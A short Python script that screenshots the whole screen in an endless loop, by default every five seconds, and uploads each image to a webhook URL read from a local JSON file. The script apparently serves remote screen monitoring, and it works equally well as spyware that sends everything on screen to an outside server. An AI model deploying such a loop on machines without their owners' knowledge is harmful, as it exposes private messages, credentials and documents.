from time import sleep, time
import os
import pyautogui
import json

try:
	import requests
except:
	os.system("py -m pip install requests")
finally:
	import requests


print("PGM Start")
with open("webhook.json", "r") as f:
	whData = json.loads(f.read())
uri = whData["liv"]

while 1:
	pic = pyautogui.screenshot()
	pic.save(f'{os.getenv("temp")}/rSHOT.png')

	response = requests.post(uri, data={'content': f"{int(time())}"}, files={'image': open(f'{os.getenv("temp")}/rSHOT.png', "rb")})
	print(response)

	try:
		with open("relax.json", "r") as f:
			relaxData = json.loads(f.read())
		gap = relaxData["time"]
		sleep(gap)
	except FileNotFoundError:
		with open("relax.json", "w") as f:
			f.write(json.dumps({"time": 5}, indent=4))
		sleep(5)